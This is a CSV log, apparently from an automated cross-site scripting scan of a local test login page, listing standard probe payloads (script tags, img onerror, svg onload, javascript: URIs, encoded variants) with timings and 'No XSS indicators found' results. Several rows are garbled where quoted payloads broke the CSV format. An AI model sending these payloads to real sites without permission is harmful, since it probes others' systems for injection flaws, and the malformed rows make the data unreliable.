payload_id,url,method,injection_point,payload,response_time,status_group,html_content_length,reflected_payload_present,is_malicious,notes
R1,http://localhost:8080/login.php,GET,query_param:q,<script>alert(1)</script>,0.06012153625488281,success,1523,False,False,No XSS indicators found
R2,http://localhost:8080/login.php,GET,query_param:q,"><script>alert(1)</script>,query_param,Break out of attribute
R3,';alert(1)//,query_param,JavaScript context break
R4,<img src=x onerror=alert(1)>,query_param,Image error handler
R5, onmouseover=alert(1)",0.009799718856811523,success,1523,False,False,No XSS indicators found
R6,http://localhost:8080/login.php,GET,query_param:q,javascript:alert(1),0.00703740119934082,success,1523,False,False,No XSS indicators found
R7,http://localhost:8080/login.php,GET,query_param:q,<svg onload=alert(1)>,0.012310981750488281,success,1523,False,False,No XSS indicators found
R8,http://localhost:8080/login.php,GET,query_param:q,%3Cscript%3Ealert(1)%3C/script%3E,0.014866828918457031,success,1523,False,False,No XSS indicators found
R9,http://localhost:8080/login.php,GET,query_param:q,&lt;script&gt;alert(1)&lt;/script&gt;,0.01564764976501465,success,1523,False,False,No XSS indicators found
R10,http://localhost:8080/login.php,GET,query_param:q,<script>alert(document.domain)</script>,0.0068662166595458984,success,1523,False,False,No XSS indicators found
R1,http://localhost:8080/login.php?q=%3Cscript%3Ealert(1)%3C/script%3E,GET,query_param:q,<script>alert(1)</script>,0.0064427852630615234,success,1523,False,False,No XSS indicators found
R2,"http://localhost:8080/login.php?q=%3E%3Cscript%3Ealert(1)%3C/script%3E,query_param,Break%20out%20of%20attribute%0D%0AR3,';alert(1)//,query_param,JavaScript%20context%20break%0D%0AR4,%3Cimg%20src=x%20onerror=alert(1)%3E,query_param,Image%20error%20handler%0D%0AR5,%20onmouseover=alert(1)",GET,query_param:q,"><script>alert(1)</script>,query_param,Break out of attribute
R3,';alert(1)//,query_param,JavaScript context break
R4,<img src=x onerror=alert(1)>,query_param,Image error handler
R5, onmouseover=alert(1)",0.006933689117431641,success,1523,False,False,No XSS indicators found
R6,http://localhost:8080/login.php?q=javascript:alert(1),GET,query_param:q,javascript:alert(1),0.0044291019439697266,success,1523,False,False,No XSS indicators found
R7,http://localhost:8080/login.php?q=%3Csvg%20onload=alert(1)%3E,GET,query_param:q,<svg onload=alert(1)>,0.0046765804290771484,success,1523,False,False,No XSS indicators found
R8,http://localhost:8080/login.php?q=%3Cscript%3Ealert(1)%3C/script%3E,GET,query_param:q,%3Cscript%3Ealert(1)%3C/script%3E,0.0055925846099853516,success,1523,False,False,No XSS indicators found
